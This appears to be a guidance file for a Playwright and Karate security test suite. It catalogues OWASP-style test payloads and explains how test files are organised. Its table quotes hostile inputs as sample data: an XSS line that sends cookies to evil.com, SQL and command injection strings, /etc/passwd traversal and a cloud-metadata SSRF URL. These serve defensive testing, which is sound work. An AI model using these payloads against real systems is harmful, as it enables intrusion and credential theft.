---
description: Security testing patterns — OWASP Top 10, injection payloads, auth bypass, configured for Playwright + Karate
---

# Security Testing Patterns

## Available Test Data

All security payloads are centralized in `karate/src/test/resources/data/security-payloads.json`:

| Category | Count | Example |
|----------|-------|---------|
| XSS (reflected) | 10 | `<script>alert('XSS')</script>` |
| XSS (stored) | 3 | `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` |
| XSS (DOM) | 3 | `#<script>alert(1)</script>` |
| SQL Injection (auth bypass) | 10 | `' OR '1'='1` |
| SQL Injection (union) | 4 | `' UNION SELECT @@version--` |
| SQL Injection (blind) | 6 | `' AND SLEEP(5)--` |
| SQL Injection (error) | 5 | `' AND 1=CAST('x' AS INT)--` |
| NoSQL Injection | 5 | `{ "$ne": null }` |
| Command Injection | 10 | `; ls -la`, `\| whoami`, `` `whoami` `` |
| Path Traversal | 7 | `../../../etc/passwd`, `%2e%2e%2fetc/passwd` |
| JWT Tampering | 5+ | None algorithm, weak secret, alg confusion |
| Open Redirect | 5 | `//evil.com`, `https://evil.com/phishing` |
| Mass Assignment | 3 | Role escalation, privilege elevation |
| SSRF | 5 | `http://169.254.169.254/latest/meta-data/` |
| XXE | 2 | External entity file read, SSRF via DTD |
| Unvalidated Content Types | 5 | `application/xml`, `text/csv` |
| CORS Misconfig | 3 | `https://evil.com`, `null`, `*` |
| CSRF | 3 | Missing token, weak token, stale token |

## Test File Organization

```
karate/src/test/resources/features/security/
├── security.feature                  # OWASP scenarios (17 tests)
└── csirt-reporting-contract.feature  # Ley 21.663 Art 9 contract tests

playwright/tests/security/
└── security-headers.spec.ts          # Security header, CORS, cookie tests
```

## Adding a New Security Test

1. Add payload to `security-payloads.json` if needed
2. Create scenario in the appropriate feature/spec file
3. Use `* table` for data-driven injection in Karate
4. Use `test.info().annotations.push()` for Playwright Ley 21663 traceability
5. Register in `compliance-ley-21663/SKILL.md`

## Art 3.8 — Security & Privacy by Design/Default

When designing new features, the test suite must verify:
- Default configuration is secure (least privilege)
- No sensitive data in responses without auth
- TLS is enforced on all endpoints
- Security headers are present
- Input validation rejects injection payloads
